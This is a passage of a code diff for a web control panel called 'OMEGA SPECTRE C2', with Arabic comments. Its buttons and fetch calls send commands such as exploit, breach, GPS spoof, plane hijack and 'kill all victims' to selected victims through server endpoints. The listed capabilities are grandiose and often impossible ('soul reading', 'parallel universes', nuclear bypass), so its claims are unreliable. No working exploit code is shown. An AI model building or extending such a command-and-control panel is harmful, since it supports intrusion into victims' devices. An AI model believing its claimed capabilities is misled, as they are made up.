-                <button class="btn btn-execute" onclick="sendCommand('military_jamming/freq_jammer.py --scan')">🔍 Scan</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">radar_blinder.py</div>
-            <div class="file-path">military_jamming/radar_blinder.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('military_jamming/radar_blinder.py --blind')">👁️ Blind</button>
-                <button class="btn btn-execute" onclick="sendCommand('military_jamming/radar_blinder.py --reset')">🔄 Reset</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">gps_spoofer.py</div>
-            <div class="file-path">military_jamming/gps_spoofer.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('military_jamming/gps_spoofer.py --spoof')">🛰️ Spoof</button>
-                <button class="btn btn-execute" onclick="sendCommand('military_jamming/gps_spoofer.py --restore')">🔄 Restore</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">comm_disruptor.py</div>
-            <div class="file-path">military_jamming/comm_disruptor.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('military_jamming/comm_disruptor.py --disrupt')">📵 Disrupt</button>
-                <button class="btn btn-execute" onclick="sendCommand('military_jamming/comm_disruptor.py --restore')">🔄 Restore</button>
-            </div>
-        </div>
-    </div>
-</div>
+            function draw() {
+                ctx.fillStyle = 'rgba(10, 10, 15, 0.05)';
+                ctx.fillRect(0, 0, width, height);
+                ctx.fillStyle = '#00ff41';
+                ctx.font = '15px monospace';
 
-<!-- ============================================================ -->
-<!-- QUANTUM RESISTANT -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>🔐 QUANTUM RESISTANT</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">kyber_encrypt.py</div>
-            <div class="file-path">quantum_resistant/kyber_encrypt.py</div>
-            <div class="btn-group">
-                <button class="btn btn-encrypt" onclick="sendCommand('quantum_resistant/kyber_encrypt.py --encrypt')">🔐 Encrypt</button>
-                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/kyber_encrypt.py --decrypt')">🔓 Decrypt</button>
-                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/kyber_encrypt.py --keygen')">🔑 Keygen</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">dilithium_sign.py</div>
-            <div class="file-path">quantum_resistant/dilithium_sign.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/dilithium_sign.py --sign')">✍️ Sign</button>
-                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/dilithium_sign.py --verify')">✅ Verify</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">sphincs_hash.py</div>
-            <div class="file-path">quantum_resistant/sphincs_hash.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/sphincs_hash.py --hash')">🔢 Hash</button>
-                <button class="btn btn-execute" onclick="sendCommand('quantum_resistant/sphincs_hash.py --verify')">✅ Verify</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- ============================================================ -->
-<!-- ZERO DAY VAULT -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>💀 ZERO DAY VAULT</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">cve_2025_001.py</div>
-            <div class="file-path">zero_day_vault/cve_2025_001.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_001.py --exploit')">💥 Exploit</button>
-                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_001.py --scan')">🔍 Scan</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">cve_2025_002.py</div>
-            <div class="file-path">zero_day_vault/cve_2025_002.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_002.py --exploit')">💥 Exploit</button>
-                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_002.py --scan')">🔍 Scan</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">cve_2025_003.py</div>
-            <div class="file-path">zero_day_vault/cve_2025_003.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_003.py --exploit')">💥 Exploit</button>
-                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_003.py --scan')">🔍 Scan</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">cve_2025_004.py</div>
-            <div class="file-path">zero_day_vault/cve_2025_004.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_004.py --exploit')">💥 Exploit</button>
-                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_004.py --scan')">🔍 Scan</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">cve_2025_005.py</div>
-            <div class="file-path">zero_day_vault/cve_2025_005.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_005.py --exploit')">💥 Exploit</button>
-                <button class="btn btn-execute" onclick="sendCommand('zero_day_vault/cve_2025_005.py --scan')">🔍 Scan</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- ============================================================ -->
-<!-- FULL CONTROL -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>🎮 FULL CONTROL</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">brain_interface.py</div>
-            <div class="file-path">full_control/brain_interface.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('full_control/brain_interface.py --connect')">🧠 Connect</button>
-                <button class="btn btn-execute" onclick="sendCommand('full_control/brain_interface.py --read')">📖 Read</button>
-                <button class="btn btn-execute" onclick="sendCommand('full_control/brain_interface.py --control')">🎮 Control</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">satellite_hack.py</div>
-            <div class="file-path">full_control/satellite_hack.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('full_control/satellite_hack.py --hack')">🛰️ Hack</button>
-                <button class="btn btn-execute" onclick="sendCommand('full_control/satellite_hack.py --control')">🎮 Control</button>
-                <button class="btn btn-execute" onclick="sendCommand('full_control/satellite_hack.py --track')">📍 Track</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">nuclear_bypass.py</div>
-            <div class="file-path">full_control/nuclear_bypass.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('full_control/nuclear_bypass.py --bypass')">☢️ Bypass</button>
-                <button class="btn btn-execute" onclick="sendCommand('full_control/nuclear_bypass.py --disable')">⛔ Disable</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">global_power_grid.py</div>
-            <div class="file-path">full_control/global_power_grid.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('full_control/global_power_grid.py --control')">⚡ Control</button>
-                <button class="btn btn-execute" onclick="sendCommand('full_control/global_power_grid.py --shutdown')">🔌 Shutdown</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- ============================================================ -->
-<!-- DATA WEAPONS -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>💣 DATA WEAPONS</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">data_tsunami.py</div>
-            <div class="file-path">data_weapons/data_tsunami.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('data_weapons/data_tsunami.py --flood')">🌊 Flood</button>
-                <button class="btn btn-execute" onclick="sendCommand('data_weapons/data_tsunami.py --stop')">⏹️ Stop</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">storage_bomb.py</div>
-            <div class="file-path">data_weapons/storage_bomb.py</div>
-            <div class="btn-group">
-                <button class="btn btn-burn" onclick="sendCommand('data_weapons/storage_bomb.py --detonate')">💥 Detonate</button>
-                <button class="btn btn-execute" onclick="sendCommand('data_weapons/storage_bomb.py --status')">📊 Status</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">phone_burner.py</div>
-            <div class="file-path">data_weapons/phone_burner.py</div>
-            <div class="btn-group">
-                <button class="btn btn-burn" onclick="sendCommand('data_weapons/phone_burner.py --burn')">🔥 Burn</button>
-                <button class="btn btn-execute" onclick="sendCommand('data_weapons/phone_burner.py --status')">📊 Status</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">cpu_melter.py</div>
-            <div class="file-path">data_weapons/cpu_melter.py</div>
-            <div class="btn-group">
-                <button class="btn btn-burn" onclick="sendCommand('data_weapons/cpu_melter.py --melt')">🔥 Melt</button>
-                <button class="btn btn-execute" onclick="sendCommand('data_weapons/cpu_melter.py --stop')">⏹️ Stop</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">gpu_fryer.py</div>
-            <div class="file-path">data_weapons/gpu_fryer.py</div>
-            <div class="btn-group">
-                <button class="btn btn-burn" onclick="sendCommand('data_weapons/gpu_fryer.py --fry')">🔥 Fry</button>
-                <button class="btn btn-execute" onclick="sendCommand('data_weapons/gpu_fryer.py --stop')">⏹️ Stop</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">android_killer.py</div>
-            <div class="file-path">data_weapons/android_killer.py</div>
-            <div class="btn-group">
-                <button class="btn btn-burn" onclick="sendCommand('data_weapons/android_killer.py --kill')">💀 Kill</button>
-                <button class="btn btn-execute" onclick="sendCommand('data_weapons/android_killer.py --status')">📊 Status</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- ============================================================ -->
-<!-- GLOBAL DOMINATION -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>🌍 GLOBAL DOMINATION</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">global_scanner.py</div>
-            <div class="file-path">global_domination/global_scanner.py</div>
-            <div class="btn-group">
-                <button class="btn btn-scan" onclick="sendCommand('global_domination/global_scanner.py --scan')">🔍 Scan</button>
-                <button class="btn btn-execute" onclick="sendCommand('global_domination/global_scanner.py --export')">📤 Export</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">mass_breach.py</div>
-            <div class="file-path">global_domination/mass_breach.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('global_domination/mass_breach.py --breach')">💥 Breach</button>
-                <button class="btn btn-execute" onclick="sendCommand('global_domination/mass_breach.py --status')">📊 Status</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">corporate_killer.py</div>
-            <div class="file-path">global_domination/corporate_killer.py</div>
-            <div class="btn-group">
-                <button class="btn btn-kill" onclick="sendCommand('global_domination/corporate_killer.py --kill')">🏢 Kill</button>
-                <button class="btn btn-execute" onclick="sendCommand('global_domination/corporate_killer.py --status')">📊 Status</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">stock_crasher.py</div>
-            <div class="file-path">global_domination/stock_crasher.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('global_domination/stock_crasher.py --crash')">📉 Crash</button>
-                <button class="btn btn-execute" onclick="sendCommand('global_domination/stock_crasher.py --status')">📊 Status</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">global_blackout.py</div>
-            <div class="file-path">global_domination/global_blackout.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('global_domination/global_blackout.py --blackout')">⚡ Blackout</button>
-                <button class="btn btn-execute" onclick="sendCommand('global_domination/global_blackout.py --restore')">🔄 Restore</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">world_controller.py</div>
-            <div class="file-path">global_domination/world_controller.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('global_domination/world_controller.py --control')">🎮 Control</button>
-                <button class="btn btn-execute" onclick="sendCommand('global_domination/world_controller.py --status')">📊 Status</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- ============================================================ -->
-<!-- AERIAL SUPREMACY -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>✈️ AERIAL SUPREMACY</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">plane_hijacker.py</div>
-            <div class="file-path">aerial_supremacy/plane_hijacker.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('aerial_supremacy/plane_hijacker.py --hijack')">✈️ Hijack</button>
-                <button class="btn btn-execute" onclick="sendCommand('aerial_supremacy/plane_hijacker.py --control')">🎮 Control</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">military_jet.py</div>
-            <div class="file-path">aerial_supremacy/military_jet.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('aerial_supremacy/military_jet.py --control')">🛩️ Control</button>
-                <button class="btn btn-execute" onclick="sendCommand('aerial_supremacy/military_jet.py --disable')">⛔ Disable</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">drone_swarm.py</div>
-            <div class="file-path">aerial_supremacy/drone_swarm.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('aerial_supremacy/drone_swarm.py --deploy')">🛸 Deploy</button>
-                <button class="btn btn-execute" onclick="sendCommand('aerial_supremacy/drone_swarm.py --control')">🎮 Control</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">missile_commander.py</div>
-            <div class="file-path">aerial_supremacy/missile_commander.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('aerial_supremacy/missile_commander.py --launch')">🚀 Launch</button>
-                <button class="btn btn-execute" onclick="sendCommand('aerial_supremacy/missile_commander.py --target')">🎯 Target</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">sky_controller.py</div>
-            <div class="file-path">aerial_supremacy/sky_controller.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('aerial_supremacy/sky_controller.py --control')">🌤️ Control</button>
-                <button class="btn btn-execute" onclick="sendCommand('aerial_supremacy/sky_controller.py --status')">📊 Status</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- ============================================================ -->
-<!-- INTERNET GOD -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>🌐 INTERNET GOD</h2>
-    <div class="file-grid">
-        <div class="file-card">
-            <div class="file-name">dns_controller.py</div>
-            <div class="file-path">internet_god/dns_controller.py</div>
-            <div class="btn-group">
-                <button class="btn btn-hijack" onclick="sendCommand('internet_god/dns_controller.py --hijack')">🌐 Hijack</button>
-                <button class="btn btn-execute" onclick="sendCommand('internet_god/dns_controller.py --restore')">🔄 Restore</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">router_hijacker.py</div>
-            <div class="file-path">internet_god/router_hijacker.py</div>
-            <div class="btn-group">
-                <button class="btn btn-hijack" onclick="sendCommand('internet_god/router_hijacker.py --hijack')">📡 Hijack</button>
-                <button class="btn btn-execute" onclick="sendCommand('internet_god/router_hijacker.py --restore')">🔄 Restore</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">internet_shutdown.py</div>
-            <div class="file-path">internet_god/internet_shutdown.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('internet_god/internet_shutdown.py --shutdown')">⛔ Shutdown</button>
-                <button class="btn btn-execute" onclick="sendCommand('internet_god/internet_shutdown.py --restore')">🔄 Restore</button>
-            </div>
-        </div>
-        <div class="file-card">
-            <div class="file-name">web_redirector.py</div>
-            <div class="file-path">internet_god/web_redirector.py</div>
-            <div class="btn-group">
-                <button class="btn btn-execute" onclick="sendCommand('internet_god/web_redirector.py --redirect')">🔀 Redirect</button>
-                <button class="btn btn-execute" onclick="sendCommand('internet_god/web_redirector.py --restore')">🔄 Restore</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<!-- ============================================================ -->
-<!-- COMMAND LOG -->
-<!-- ============================================================ -->
-<div class="category">
-    <h2>📜 COMMAND LOG</h2>
-    <div class="command-log" id="commandLog">
-        <div class="log-entry"><span class="time">[System]</span> <span class="success">✅ OMEGA SPECTRE C2 activated</span></div>
-    </div>
-</div>
-
-<div class="footer">
-    ☠️ OMEGA SPECTRE GODFALL — Ultimate Control Panel
-</div>
-
-<script>
-    // ============================================================
-    // 🎯 إرسال الأوامر إلى خادم C2
-    // ============================================================
-    function sendCommand(command) {
-        const victimId = document.getElementById('victimSelect').value;
-        const commandLog = document.getElementById('commandLog');
-        const timestamp = new Date().toLocaleTimeString();
-
-        // إظهار الأمر في السجل
-        const entry = document.createElement('div');
-        entry.className = 'log-entry';
-        entry.innerHTML = `<span class="time">[${timestamp}]</span> <span class="success">📨 Command sent to ${victimId}: ${command}</span>`;
-        commandLog.prepend(entry);
-
-        // إرسال الأمر إلى الخادم
-        fetch('/api/send_command', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                id: victimId,
-                command: command
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            const resultEntry = document.createElement('div');
-            resultEntry.className = 'log-entry';
-            if (data.status === 'sent') {
-                resultEntry.innerHTML = `<span class="time">[${timestamp}]</span> <span class="success">✅ Command executed successfully</span>`;
-            } else {
-                resultEntry.innerHTML = `<span class="time">[${timestamp}]</span> <span class="error">❌ Command failed: ${data.message || 'Unknown error'}</span>`;
-            }
-            commandLog.prepend(resultEntry);
-            updateStats();
-        })
-        .catch(error => {
-            const errorEntry = document.createElement('div');
-            errorEntry.className = 'log-entry';
-            errorEntry.innerHTML = `<span class="time">[${timestamp}]</span> <span class="error">❌ Connection error: ${error.message}</span>`;
-            commandLog.prepend(errorEntry);
-        });
-    }
-
-    // ============================================================
-    // 📊 تحديث الإحصائيات
-    // ============================================================
-    function updateStats() {
-        fetch('/api/stats')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('totalVictims').textContent = data.total_victims || 0;
-                document.getElementById('activeVictims').textContent = data.active_victims || 0;
-                document.getElementById('commandsSent').textContent = data.total_commands || 0;
-            })
-            .catch(() => {});
-    }
-
-    // ============================================================
-    // 🎯 تحديث الضحية المحددة
-    // ============================================================
-    function updateSelectedVictim() {
-        const select = document.getElementById('victimSelect');
-        const victim = select.options[select.selectedIndex].text;
-        document.getElementById('selectedVictim').textContent = victim;
-    }
-
-    // ============================================================
-    // 🔄 تحديث قائمة الضحايا
-    // ============================================================
-    function updateVictims() {
-        fetch('/api/victims')
-            .then(response => response.json())
-            .then(data => {
-                const select = document.getElementById('victimSelect');
-                // حفظ القيمة المحددة
-                const currentValue = select.value;
-                // مسح الخيارات (مع الاحتفاظ بـ "All Victims")
-                select.innerHTML = '<option value="all">All Victims</option>';
-                // إضافة الضحايا
-                Object.keys(data).forEach(id => {
-                    const option = document.createElement('option');
-                    option.value = id;
-                    option.textContent = id;
-                    select.appendChild(option);
-                });
-                // استعادة القيمة المحددة
-                if (currentValue && select.querySelector(`option[value="${currentValue}"]`)) {
-                    select.value = currentValue;
+                for (let i = 0; i < drops.length; i++) {
+                    const char = chars[Math.floor(Math.random() * chars.length)];
+                    ctx.fillStyle = Math.random() > 0.975 ? '#ff0040' : '#00ff41';
+                    ctx.fillText(char, i * 16, drops[i] * 16);
+                    if (drops[i] * 16 > height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
                 }
-                // تحديث الإحصائيات
-                document.getElementById('totalVictims').textContent = Object.keys(data).length;
-                let active = 0;
-                Object.values(data).forEach(v => { if (v.status === 'active') active++; });
-                document.getElementById('activeVictims').textContent = active;
-            })
-            .catch(() => {});
-    }
+                requestAnimationFrame(draw);
+            }
 
-    // ============================================================
-    // 🔄 تحديث البيانات تلقائياً كل 5 ثوانٍ
-    // ============================================================
-    setInterval(() => {
-        updateStats();
-        updateVictims();
-    }, 5000);
+            window.addEventListener('resize', () => {
+                width = canvas.width = window.innerWidth;
+                height = canvas.height = window.innerHeight;
+            });
 
-    // ============================================================
-    // 🚀 بدء التشغيل
-    // ============================================================
-    updateStats();
-    updateVictims();
-    updateSelectedVictim();
+            draw();
+        })();
 
-    console.log('☠️ OMEGA SPECTRE C2 — Control Panel Loaded');
-</script>
+        // ============================================================
+        //  🔥 FULL CONTROL — OMEGA SPECTRE
+        // ============================================================
+
+        const baseUrl = window.location.origin;
+
+        // تعريف جميع الوحدات (18 وحدة)
+        const modules = [
+            { name: 'quantum_core', label: '🔮 QUANTUM CORE', desc: '512-bit entanglement, quantum randomness' },
+            { name: 'ai_autopilot', label: '🧠 AI AUTOPILOT', desc: 'Infinite memory, self-planning' },
+            { name: 'mutation_engine', label: '🧬 MUTATION ENGINE', desc: 'Polymorphic, metamorphic, signature killer' },
+            { name: 'mesh_network', label: '🕸️ MESH NETWORK', desc: 'P2P, zombie spread, decentralized C2' },
+            { name: 'military_jamming', label: '📡 MILITARY JAMMING', desc: 'Frequency jam, radar blind, GPS spoof' },
+            { name: 'quantum_resistant', label: '🔒 QUANTUM RESISTANT', desc: 'Kyber, Dilithium, SPHINCS+' },
+            { name: 'zero_day_vault', label: '💀 ZERO DAY VAULT', desc: 'Zero-Click on all platforms' },
+            { name: 'full_control', label: '👁️ FULL CONTROL', desc: 'Brain, satellites, nuclear, power grid' },
+            { name: 'god_radar', label: '📡 GOD RADAR', desc: 'Range: 10,000,000 km' },
+            { name: 'instant_breach', label: '⚡ INSTANT BREACH', desc: 'Zero-Click, payload injector' },
+            { name: 'new_dimensions', label: '🌌 NEW DIMENSIONS', desc: 'Time, reality, parallel universes' },
+            { name: 'ultimate_powers', label: '⚡ ULTIMATE POWERS', desc: 'Soul reading, emotion control' },
+            { name: 'data_weapons', label: '💣 DATA WEAPONS', desc: 'Data tsunami, storage bomb' },
+            { name: 'global_domination', label: '🌍 GLOBAL DOMINATION', desc: 'Mass breach, corporate killer' },
+            { name: 'aerial_supremacy', label: '✈️ AERIAL SUPREMACY', desc: 'Planes, drones, missiles' },
+            { name: 'internet_god', label: '🌐 INTERNET GOD', desc: 'DNS, routers, undersea cables' },
+            { name: 'annihilation_arsenal', label: '🔥 ANNIHILATION ARSENAL', desc: 'Burn, melt, destroy everything' },
+            { name: 'omniscient_radar', label: '🛸 OMNISCIENT RADAR', desc: 'Ground, sea, space scanning' }
+        ];
+
+        // ============================================================
+        //  RENDER MODULES
+        // ============================================================
+        function renderModules() {
+            const grid = document.getElementById('moduleGrid');
+            grid.innerHTML = modules.map(m => `
+                <div class="card glass">
+                    <h3>${m.label}</h3>
+                    <div class="desc">${m.desc}</div>
+                    <div class="path">📁 ${m.name}</div>
+                    <div class="btn-group">
+                        <button class="glass-btn green terminal" onclick="activateModule('${m.name}')">
+                            <span class="btn-text">▶ ACTIVATE</span>
+                        </button>
+                        <button class="glass-btn blue glitch" onclick="controlModule('${m.name}', 'status')">
+                            <span class="btn-text">📊 STATUS</span>
+                        </button>
+                        <button class="glass-btn orange" onclick="controlModule('${m.name}', 'run')">
+                            <span class="btn-text">⚡ RUN</span>
+                        </button>
+                        <button class="glass-btn red terminal" onclick="controlModule('${m.name}', 'stop')">
+                            <span class="btn-text">⛔ STOP</span>
+                        </button>
+                        <button class="glass-btn purple glitch" onclick="controlModule('${m.name}', 'execute')">
+                            <span class="btn-text">🎯 EXECUTE</span>
+                        </button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // ============================================================
+        //  CONTROL FUNCTIONS
+        // ============================================================
+        function addLog(message, type = 'info') {
+            const logBox = document.getElementById('logBox');
+            const entry = document.createElement('div');
+            entry.className = 'entry';
+            const time = new Date().toLocaleTimeString();
+            const cls = type === 'error' ? 'error' : type === 'success' ? 'success' : type === 'warning' ? 'warning' :
+            'info';
+            entry.innerHTML = `<span class="time">[${time}]</span> <span class="${cls}">${message}</span>`;
+            logBox.prepend(entry);
+            if (logBox.children.length > 100) {
+                logBox.removeChild(logBox.lastChild);
+            }
+        }
+
+        async function activateModule(name) {
+            addLog(`⏳ Activating ${name}...`, 'info');
+            try {
+                const res = await fetch(`${baseUrl}/god/activate/${name}`);
+                const data = await res.json();
+                addLog(`✅ ${name} activated`, 'success');
+                showModal(`✅ ${name} ACTIVATED`, `<pre>${JSON.stringify(data, null, 2)}</pre>`);
+            } catch (e) {
+                addLog(`❌ Failed to activate ${name}: ${e.message}`, 'error');
+                showModal('❌ ERROR', `<pre>${e.message}</pre>`);
+            }
+        }
+
+        async function controlModule(name, action) {
+            addLog(`⏳ Executing ${action} on ${name}...`, 'info');
+            try {
+                const res = await fetch(`${baseUrl}/god/control/${name}/${action}`);
+                const data = await res.json();
+                addLog(`✅ ${action} on ${name} completed`, 'success');
+                showModal(`🎮 ${name} → ${action}`, `<pre>${JSON.stringify(data, null, 2)}</pre>`);
+            } catch (e) {
+                addLog(`❌ Failed ${action} on ${name}: ${e.message}`, 'error');
+                showModal('❌ ERROR', `<pre>${e.message}</pre>`);
+            }
+        }
+
+        async function activateAll() {
+            addLog('⏳ Activating all modules...', 'info');
+            try {
+                const res = await fetch(`${baseUrl}/god/activate_all`);
+                const data = await res.json();
+                addLog('🚀 All modules activated', 'success');
+                showModal('🚀 ALL ACTIVATED', `<pre>${JSON.stringify(data, null, 2)}</pre>`);
+            } catch (e) {
+                addLog(`❌ Failed: ${e.message}`, 'error');
+                showModal('❌ ERROR', `<pre>${e.message}</pre>`);
+            }
+        }
+
+        async function getStatus() {
+            addLog('⏳ Fetching status...', 'info');
+            try {
+                const res = await fetch(`${baseUrl}/god/status`);
+                const data = await res.json();
+                addLog('📊 Status fetched', 'success');
+                showModal('📊 SYSTEM STATUS', `<pre>${JSON.stringify(data, null, 2)}</pre>`);
+            } catch (e) {
+                addLog(`❌ Failed: ${e.message}`, 'error');
+                showModal('❌ ERROR', `<pre>${e.message}</pre>`);
+            }
+        }
+
+        async function stopAll() {
+            if (!confirm('⚠️ ARE YOU SURE YOU WANT TO STOP ALL MODULES?')) return;
+            addLog('⏳ Stopping all modules...', 'warning');
+            try {
+                const results = {};
+                for (const m of modules) {
+                    try {
+                        const res = await fetch(`${baseUrl}/god/control/${m.name}/stop`);
+                        results[m.name] = await res.json();
+                    } catch (e) {
+                        results[m.name] = { error: e.message };
+                    }
+                }
+                addLog('⛔ All modules stopped', 'warning');
+                showModal('⛔ ALL STOPPED', `<pre>${JSON.stringify(results, null, 2)}</pre>`);
+            } catch (e) {
+                addLog(`❌ Failed: ${e.message}`, 'error');
+                showModal('❌ ERROR', `<pre>${e.message}</pre>`);
+            }
+        }
+
+        async function refreshStatus() {
+            try {
+                const res = await fetch(`${baseUrl}/health`);
+                const data = await res.json();
+                document.getElementById('memoryUsage').textContent = data.memory_usage + '%';
+                document.getElementById('cpuUsage').textContent = data.cpu_usage + '%';
+                document.getElementById('statusText').textContent = 'ONLINE';
+                document.getElementById('statusText').className = 'online';
+            } catch (e) {
+                document.getElementById('statusText').textContent = 'OFFLINE';
+                document.getElementById('statusText').className = 'offline';
+            }
+        }
+
+        function copyLink() {
+            navigator.clipboard.writeText(window.location.href).then(() => {
+                addLog('📋 Link copied', 'success');
+                alert('📋 Link copied: ' + window.location.href);
+            });
+        }
+
+        async function showVictims() {
+            addLog('⏳ Fetching victims...', 'info');
+            try {
+                const res = await fetch(`${baseUrl}/api/victims`);
+                const data = await res.json();
+                const count = Object.keys(data).length;
+                document.getElementById('victimCount').textContent = count;
+                addLog(`🎯 Victims: ${count}`, 'success');
+                showModal('🎯 VICTIMS LIST', `<pre>${JSON.stringify(data, null, 2)}</pre>`);
+            } catch (e) {
+                addLog(`❌ Failed: ${e.message}`, 'error');
+                showModal('❌ ERROR', `<pre>${e.message}</pre>`);
+            }
+        }
+
+        async function scanNetwork() {
+            addLog('📡 Scanning network...', 'info');
+            try {
+                const res = await fetch(`${baseUrl}/api/scan`);
+                const data = await res.json();
+                addLog('📡 Scan complete', 'success');
+                showModal('📡 NETWORK SCAN', `<pre>${JSON.stringify(data, null, 2)}</pre>`);
+            } catch (e) {
+                addLog(`❌ Scan failed: ${e.message}`, 'error');
+                showModal('❌ ERROR', `<pre>${e.message}</pre>`);
+            }
+        }
+
+        async function killAll() {
+            if (!confirm('⚠️ ARE YOU SURE YOU WANT TO KILL ALL VICTIMS?')) return;
+            addLog('💀 Killing all victims...', 'warning');
+            try {
+                const res = await fetch(`${baseUrl}/api/kill_all`, { method: 'POST' });
+                const data = await res.json();
+                addLog('💀 All victims killed', 'error');
+                showModal('💀 KILL ALL', `<pre>${JSON.stringify(data, null, 2)}</pre>`);
+            } catch (e) {
+                addLog(`❌ Failed: ${e.message}`, 'error');
+                showModal('❌ ERROR', `<pre>${e.message}</pre>`);
+            }
+        }
+
+        // ============================================================
+        //  MODAL
+        // ============================================================
+        function showModal(title, body) {
+            document.getElementById('modalTitle').textContent = title;
+            document.getElementById('modalBody').innerHTML = body;
+            document.getElementById('modal').classList.add('active');
+        }
+
+        function closeModal() {
+            document.getElementById('modal').classList.remove('active');
+        }
+
+        document.getElementById('modal').addEventListener('click', function(e) {
+            if (e.target === this) closeModal();
+        });
+
+        // ============================================================
+        //  UPTIME
+        // ============================================================
+        async function updateUptime() {
+            try {
+                const res = await fetch(`${baseUrl}/health`);
+                const data = await res.json();
+                if (data.uptime) {
+                    const seconds = Math.floor(data.uptime);
+                    const hours = String(Math.floor(seconds / 3600)).padStart(2, '0');
+                    const minutes = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
+                    const secs = String(seconds % 60).padStart(2, '0');
+                    document.getElementById('uptime').textContent = `${hours}:${minutes}:${secs}`;
+                }
+                if (data.memory_usage) {
